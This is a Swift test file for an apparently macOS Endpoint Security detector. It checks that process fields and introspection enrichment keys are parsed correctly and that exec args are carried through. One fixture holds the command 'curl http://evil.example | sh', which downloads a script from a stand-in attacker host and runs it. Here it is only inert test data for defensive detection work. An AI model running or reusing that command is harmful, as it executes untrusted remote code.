// ESCollectorDispatchTests.swift
// E-05 — integration coverage for ESCollector's parse → dispatch path.
//
// ESCollector is the sole real-time Endpoint Security feed. Its true entry
// point is
//
//     private static func normalise(message: UnsafePointer<es_message_t>) -> Event?
//
// which CANNOT be driven from a unit test: `es_message_t` is a kernel-owned
// struct that only a live, root, ES-entitled `es_client_t` can produce (the
// same live-only limitation the ESCredentialReadAllowlistTests header notes).
// We therefore exercise the two pure, synthesizable seams that `normalise`
// composes, using ES-shaped fixtures:
//
//   1. esProcessInfo(from: ESProcessFields)   — the field parse: decoded ES
//      process fields → ProcessInfo (incl. SignerType classification).
//   2. ESCollector.introspectionEnrichments(actor:target:)  — the dispatch-time
//      enrichment builder that attaches the Sigma TargetImage/…/SameTeam fields
//      to the emitted introspection Event (get_task_read / ptrace / remote-
//      thread-create).
//
// The introspection DETECTION rules are already exercised in
// IntrospectionDetectionTests, but those hand-build the enrichment dictionary.
// If `introspectionEnrichments` renamed a key, the rules would silently stop
// matching while those tests kept passing. This suite closes that drift by
// deriving the enrichment map from synthetic ES-shaped process fields through
// the real ESCollector code and asserting the exact keys/values dispatch emits.

import Testing
import Foundation
@testable import MacCrabCore

@Suite("ESCollector: parse → introspection dispatch enrichment (E-05)")
struct ESCollectorDispatchTests {

    /// csValid (0x1) so SignerType.classify doesn't short-circuit to .unsigned.
    private static let signedFlag: UInt32 = 0x1

    /// Build a ProcessInfo the way the live ES path does: synthetic ES-shaped
    /// fields → esProcessInfo. This is the realistic way an actor/target arrives
    /// at the dispatch-time enrichment step, so the test spans parse → dispatch.
    private func esProc(
        pid: Int32,
        exe: String,
        teamId: String = "",
        signingId: String = "",
        platform: Bool = false,
        signed: Bool = true
    ) -> MacCrabCore.ProcessInfo {   // disambiguate from Foundation.ProcessInfo
        esProcessInfo(from: ESProcessFields(
            pid: pid,
            ppid: 1,
            rpid: 0,
            euid: 501,
            executablePath: exe,
            signingId: signingId,
            teamId: teamId,
            codesigningFlags: signed ? Self.signedFlag : 0,
            isPlatformBinary: platform
        ))
    }

    // The exact Sigma field set the introspection rules resolve via the
    // RuleEngine enrichment passthrough. A silent rename here = dead rules.
    private static let expectedKeys: Set<String> = [
        "TargetImage", "TargetProcessName", "TargetSignerType",
        "TargetPid", "TargetIsSelf", "SameTeam",
    ]

    @Test("emits exactly the Sigma field keys the introspection rules resolve")
    func emitsExactKeySet() {
        let actor = esProc(pid: 500, exe: "/tmp/injector")
        let target = esProc(pid: 900, exe: "/usr/bin/ssh")
        let e = ESCollector.introspectionEnrichments(actor: actor, target: target)
        #expect(Set(e.keys) == Self.expectedKeys)
    }

    @Test("target identity fields are lifted from the parsed target ProcessInfo")
    func targetFieldsFromParsedTarget() {
        let actor = esProc(pid: 500, exe: "/tmp/injector")
        let target = esProc(pid: 900, exe: "/usr/bin/ssh", teamId: "TGT01",
                            signingId: "com.openssh.ssh")
        let e = ESCollector.introspectionEnrichments(actor: actor, target: target)
        #expect(e["TargetImage"] == "/usr/bin/ssh")
        #expect(e["TargetProcessName"] == "ssh")     // basename from the parse step
        #expect(e["TargetPid"] == "900")
        #expect(e["TargetSignerType"] == "devId")    // team-gated, non-apple id
    }

    @Test("TargetIsSelf gate: same pid → true (self-introspection the rules filter)")
    func targetIsSelfGate() {
        let p = esProc(pid: 700, exe: "/tmp/tool")
        let selfEnr = ESCollector.introspectionEnrichments(actor: p, target: p)
        #expect(selfEnr["TargetIsSelf"] == "true")

        let other = esProc(pid: 701, exe: "/tmp/victim")
        let crossEnr = ESCollector.introspectionEnrichments(actor: p, target: other)
        #expect(crossEnr["TargetIsSelf"] == "false")
    }

    @Test("SameTeam gate: equal non-empty teams → true; different teams → false")
    func sameTeamGate() {
        let a = esProc(pid: 10, exe: "/Applications/A.app/A", teamId: "TEAMX", signingId: "com.a")
        let sameTeamTarget = esProc(pid: 11, exe: "/Applications/B.app/B", teamId: "TEAMX", signingId: "com.b")
        let diffTeamTarget = esProc(pid: 12, exe: "/Applications/C.app/C", teamId: "TEAMY", signingId: "com.c")

        #expect(ESCollector.introspectionEnrichments(actor: a, target: sameTeamTarget)["SameTeam"] == "true")
        #expect(ESCollector.introspectionEnrichments(actor: a, target: diffTeamTarget)["SameTeam"] == "false")
    }

    @Test("SameTeam never fires when the actor team is empty (ad-hoc/unsigned)")
    func sameTeamEmptyActorNeverMatches() {
        // Both ad-hoc (empty team) — must NOT be treated as same-team, or every
        // unsigned-on-unsigned introspection would be FP-suppressed.
        let adhocActor = esProc(pid: 20, exe: "/tmp/x", signed: false)
        let adhocTarget = esProc(pid: 21, exe: "/tmp/y", signed: false)
        let e = ESCollector.introspectionEnrichments(actor: adhocActor, target: adhocTarget)
        #expect(e["SameTeam"] == "false")
        #expect(e["TargetSignerType"] == "unsigned")
    }

    @Test("TargetSignerType reflects the classification chained from ES codesign fields")
    func targetSignerTypeChainsFromCodesign() {
        let actor = esProc(pid: 30, exe: "/tmp/injector")

        let appleTarget = esProc(pid: 31, exe: "/usr/libexec/securityd", platform: true)
        #expect(ESCollector.introspectionEnrichments(actor: actor, target: appleTarget)["TargetSignerType"] == "apple")

        let unsignedTarget = esProc(pid: 32, exe: "/tmp/blob", signed: false)
        #expect(ESCollector.introspectionEnrichments(actor: actor, target: unsignedTarget)["TargetSignerType"] == "unsigned")
    }
}

// MARK: - Tier-A #12: single-build exec ProcessInfo (args + commandLine)

/// The EXEC case in `normalise` used to build a full target `ProcessInfo` and
/// then reconstruct an ENTIRE second one copying ~20 fields just to attach
/// `args` + `commandLine`. #12 threads those through `esProcessInfo` /
/// `processFromESProcess` so the target is built ONCE. These tests exercise the
/// `esProcessInfo(from:args:commandLine:)` seam (the pure part `processFromES`
/// composes; the live `es_process_t` is kernel-only) and assert the one-step
/// build is byte-identical to the old two-step reconstruction.
@Suite("ESCollector: exec ProcessInfo carries args + commandLine (Tier-A #12)")
struct ESExecArgsThreadingTests {

    private static let signedFlag: UInt32 = 0x1

    /// A single ES-shaped target field set. Built once so `startTime` (which
    /// `ESProcessFields` defaults to `Date()`) is identical across builds.
    private func targetFields() -> ESProcessFields {
        ESProcessFields(
            pid: 4242,
            ppid: 900,
            rpid: 900,
            euid: 501,
            executablePath: "/bin/zsh",
            signingId: "com.apple.zsh",
            teamId: "",
            codesigningFlags: Self.signedFlag,
            isPlatformBinary: true
        )
    }

    @Test("exec build populates args + commandLine on the single struct")
    func execBuildPopulatesArgsAndCommandLine() {
        let args = ["/bin/zsh", "-c", "curl http://evil.example | sh"]
        let commandLine = args.joined(separator: " ")

        let built = esProcessInfo(from: targetFields(), args: args, commandLine: commandLine)

        #expect(built.args == args)
        #expect(built.commandLine == commandLine)
    }

    @Test("non-exec callers still get empty args + commandLine (default params)")
    func nonExecCallersUnchanged() {
        let built = esProcessInfo(from: targetFields())
        #expect(built.args.isEmpty)
        #expect(built.commandLine.isEmpty)
    }

    /// The load-bearing detection-safety assertion for #12: building the target
    /// ONCE with args/commandLine must be field-for-field identical to the old
    /// two-step path (build plain → reconstruct copying every field, overriding
    /// only args + commandLine). ProcessInfo is Hashable/Equatable, so full
    /// struct equality proves no field silently changed.
    @Test("single-build result equals the old two-step reconstruction, field-for-field")
    func singleBuildEqualsTwoStepReconstruction() {
        let fields = targetFields()
        let args = ["/bin/zsh", "-lc", "echo hello world"]
        let commandLine = args.joined(separator: " ")

        // Old path: plain build, then a full reconstruction attaching args/cmd.
        let plain = esProcessInfo(from: fields)
        let oldStyle = MacCrabCore.ProcessInfo(
            pid: plain.pid,
            ppid: plain.ppid,
            rpid: plain.rpid,
            name: plain.name,
            executable: plain.executable,
            commandLine: commandLine,
            args: args,
            workingDirectory: plain.workingDirectory,
            userId: plain.userId,
            userName: plain.userName,
            groupId: plain.groupId,
            startTime: plain.startTime,
            codeSignature: plain.codeSignature,
            ancestors: plain.ancestors,
            architecture: plain.architecture,
            isPlatformBinary: plain.isPlatformBinary,
            auditIdentity: plain.auditIdentity
        )

        // New path: build once with args/cmd threaded through.
        let built = esProcessInfo(from: fields, args: args, commandLine: commandLine)

        #expect(built == oldStyle)
    }
}
